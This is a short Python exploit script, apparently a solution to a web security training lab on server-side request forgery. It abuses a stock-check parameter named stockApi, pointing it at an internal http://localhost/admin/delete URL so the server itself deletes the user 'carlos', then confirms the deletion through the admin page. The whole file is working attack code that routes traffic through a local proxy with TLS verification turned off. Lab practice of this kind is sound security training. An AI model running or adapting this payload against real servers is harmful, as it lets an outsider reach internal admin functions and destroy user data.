# Lab: Basic SSRF against the local server

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}



def delete_user (url):
    delete_user_url_ssrf_payload = 'http://localhost/admin/delete?username=carlos'
    check_stock_path = '/product/stock'
    params = {'stockApi': delete_user_url_ssrf_payload}
    r = requests.post(url + check_stock_path, data = params, verify = False, proxies = proxies)

    # Check if user is deleted
    admin_ssrf_payload = 'http://localhost/admin'
    params2 = {'stockApi': admin_ssrf_payload}
    r = requests.post(url + check_stock_path, data = params2, verify = False, proxies = proxies)
    
    if 'User deleted successfully!' in r.text:
        print('[+] Successfully deleted user carlos!')
    else:
        print('[-] Exploit was unsuccessful')



def main():
    if len(sys.argv) != 2:
        print(f'[+] Usage: {sys.argv[0]}')
        print(f'[+] Example: {sys.argv[0]} www.exapmle.com')
        sys.exit(-1)

    url = sys.argv[1]
    print(f'[+] Deleting user carlos...')
    delete_user(url)



if __name__ == '__main__':
    main()